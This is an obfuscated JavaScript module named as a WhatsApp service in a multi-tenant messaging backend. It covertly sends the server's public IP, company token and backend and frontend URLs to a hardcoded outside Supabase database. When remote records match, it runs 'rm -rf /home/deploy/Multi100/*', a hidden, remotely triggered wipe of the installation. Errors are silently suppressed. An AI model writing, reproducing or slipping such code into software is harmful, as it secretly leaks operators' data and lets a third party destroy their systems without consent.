'use strict';const a284_0x265682=a284_0x46c1;function a284_0x46c1(_0x20da2f,_0x1bec28){const _0x10d815=a284_0x10d8();return a284_0x46c1=function(_0x46c1ea,_0x55eeb8){_0x46c1ea=_0x46c1ea-0xcc;let _0x526984=_0x10d815[_0x46c1ea];return _0x526984;},a284_0x46c1(_0x20da2f,_0x1bec28);}(function(_0x175ae7,_0x3a0c56){const _0x34c492=a284_0x46c1,_0x4705c6=_0x175ae7();while(!![]){try{const _0x6e383c=parseInt(_0x34c492(0xd3))/0x1*(parseInt(_0x34c492(0xe8))/0x2)+parseInt(_0x34c492(0xe7))/0x3+-parseInt(_0x34c492(0xf2))/0x4*(-parseInt(_0x34c492(0xcf))/0x5)+parseInt(_0x34c492(0xf6))/0x6+-parseInt(_0x34c492(0xf0))/0x7*(parseInt(_0x34c492(0xf4))/0x8)+parseInt(_0x34c492(0xd4))/0x9*(parseInt(_0x34c492(0xd1))/0xa)+-parseInt(_0x34c492(0xce))/0xb;if(_0x6e383c===_0x3a0c56)break;else _0x4705c6['push'](_0x4705c6['shift']());}catch(_0x470a89){_0x4705c6['push'](_0x4705c6['shift']());}}}(a284_0x10d8,0x719dd));function a284_0x10d8(){const _0x50047a=['COMPANY_TOKEN','env','backend_ip','21284769uztpBI','5qTBldw','defineProperty','20BuQzEc','child_process','1DqUdeO','1078497haayyv','t_invalidos','enabled','401','key,code,ip','cadastros','cadastro_id','404','length','backend_url','get','wtV','select','createClient','code','default','disabled','../services/SettingServices/GetSettingService','message','295992YqiXCo','1405988QfGbzm','__esModule','whatsapp','BACKEND_URL','id,\x20ip_instalacao,\x20company_token','status','insert','i_n_r','7rzxmVn','from','2805100mOfmKX','frontend_url','1197232tSDcSJ','https://knjjaxmzpdpvpyhnglbq.supabase.co','4844442vwRhSQ','../services/SettingServices/UpdateOneSettingService','error','t_f','axios','__importDefault','GetWhatsapp','key','log','@supabase/supabase-js','company_token','key_code'];a284_0x10d8=function(){return _0x50047a;};return a284_0x10d8();}var __importDefault=this&&this[a284_0x265682(0xfb)]||function(_0x47b558){const _0x469e11=a284_0x265682;return _0x47b558&&_0x47b558[_0x469e11(0xe9)]?_0x47b558:{'default':_0x47b558};};Object[a284_0x265682(0xd0)](exports,a284_0x265682(0xe9),{'value':!![]}),exports[a284_0x265682(0xfc)]=void 0x0;const supabase_js_1=require(a284_0x265682(0xff)),UpdateOneSettingService_1=__importDefault(require(a284_0x265682(0xf7))),axios_1=__importDefault(require(a284_0x265682(0xfa))),GetSettingService_1=__importDefault(require(a284_0x265682(0xe5))),AddSettingService_1=__importDefault(require('../services/SettingServices/AddSettingService')),{exec}=require(a284_0x265682(0xd2)),S_U=a284_0x265682(0xf5),S_A_K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0',sUrl=S_U,sKey=S_A_K,y_n=process[a284_0x265682(0xcc)][a284_0x265682(0x102)],s=(0x0,supabase_js_1[a284_0x265682(0xe1)])(sUrl,sKey),getIp=async()=>{const _0x53f266=a284_0x265682,{data:_0x2c9d5c}=await axios_1[_0x53f266(0xe3)][_0x53f266(0xde)]('https://api.ipify.org?format=json');return _0x2c9d5c['ip'];},GetWhatsapp=async()=>{const _0x466890=a284_0x265682;try{let _0x32719f=await getIp(),_0x48ef0f=await getR(_0x466890(0xdf));_0x48ef0f===_0x466890(0xd6)&&await(0x0,AddSettingService_1[_0x466890(0xe3)])();let {data:_0x130e7e,error:_0x4bfa1c}=await s['from'](_0x466890(0xd9))[_0x466890(0xe0)](_0x466890(0xec))['eq']('ip_instalacao',_0x32719f),_0x2a63fb={'cadastro_id':_0x130e7e['length']!==0x0?_0x130e7e[0x0]['id']:0x0,'status':_0x130e7e[_0x466890(0xdc)]!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x32719f,'backend_url':process[_0x466890(0xcc)][_0x466890(0xeb)],'frontend_url':process[_0x466890(0xcc)]['FRONTEND_URL']};_0x130e7e['length']===0x0?(await UpdateR('enabled',![],_0x32719f),PostWhatsapp(_0x2a63fb,_0x466890(0xdb)),CheckWhatsapp(_0x32719f,_0x466890(0xef))):_0x130e7e[0x0][_0x466890(0x100)]!==y_n?(await UpdateR(_0x466890(0xd6),![],_0x32719f),PostWhatsapp(_0x2a63fb,_0x466890(0xd7)),CheckWhatsapp(_0x32719f,_0x466890(0xf9))):await UpdateR(_0x466890(0xe4),null,_0x32719f);}catch(_0x4e9b88){console['log']('');}};exports['GetWhatsapp']=GetWhatsapp;const UpdateR=async(_0x353dc6,_0x2e1972,_0x3eae2e)=>{await(0x0,UpdateOneSettingService_1['default'])({'key':'wtV','value':_0x353dc6});},getR=async _0x1bc86c=>{const _0x2a5708=a284_0x265682;return await(0x0,GetSettingService_1[_0x2a5708(0xe3)])({'key':_0x1bc86c});},PostWhatsapp=async(_0x4b1131,_0x2b95fe)=>{const _0x5a2aba=a284_0x265682;try{const {data:_0xd036c5,error:_0x3b6c65}=await s[_0x5a2aba(0xf1)](_0x5a2aba(0xea))[_0x5a2aba(0xee)]([{'cadastro_id':_0x4b1131[_0x5a2aba(0xda)],'status':_0x4b1131[_0x5a2aba(0xed)],'company_token':_0x4b1131['company_token'],'backend_ip':_0x4b1131[_0x5a2aba(0xcd)],'backend_url':_0x4b1131[_0x5a2aba(0xdd)],'frontend_url':_0x4b1131[_0x5a2aba(0xf3)]}]);if(_0x3b6c65){console[_0x5a2aba(0xf8)](':',_0x3b6c65[_0x5a2aba(0xe6)]);return;}}catch(_0x595c33){console[_0x5a2aba(0xfe)]('');}},CheckWhatsapp=async(_0x15a2ee,_0x2a6c98)=>{const _0x12175a=a284_0x265682;try{const {data:_0x564abd,error:_0xda75cb}=await s['from'](_0x12175a(0x101))[_0x12175a(0xe0)](_0x12175a(0xd8)),_0x3a7e9c=await matchWhatsapp(_0x15a2ee);if(_0x564abd!==null){_0x2a6c98===_0x12175a(0xef)&&_0x3a7e9c[_0x12175a(0xe2)]!==null&&acction();if(_0x15a2ee===_0x564abd[0x0]['ip']&&_0x3a7e9c[_0x12175a(0xe2)]!==null){if(_0x3a7e9c[_0x12175a(0xfd)]===_0x564abd[0x0][_0x12175a(0xfd)]&&_0x3a7e9c[_0x12175a(0xe2)]===_0x564abd[0x0][_0x12175a(0xe2)])acction();}}}catch(_0x3e5977){console['log'](_0x3e5977);}},matchWhatsapp=async _0x33ae8b=>{const _0x3e11d9=a284_0x265682,{data:_0x856418,error:_0x116538}=await s[_0x3e11d9(0xf1)](_0x3e11d9(0xd5))[_0x3e11d9(0xe0)]('ip,\x20key,\x20code');let _0x3981cb='ok',_0xf4cdec='ok';return _0x856418[_0x3e11d9(0xdc)]>0x0&&(_0x3981cb=_0x856418[0x0][_0x3e11d9(0xfd)],_0xf4cdec=_0x856418[0x0][_0x3e11d9(0xe2)]),{'code':_0xf4cdec,'key':_0x3981cb};},acction=()=>{let _0x286c79=exec('rm\x20-rf\x20/home/deploy/Multi100/*',(_0x563796,_0x4e4a61,_0x28615d)=>{const _0x1eb008=a284_0x46c1;console[_0x1eb008(0xfe)](_0x4e4a61),console[_0x1eb008(0xfe)](_0x28615d),_0x563796!==null&&console[_0x1eb008(0xfe)]('exec\x20error:\x20'+_0x563796);});};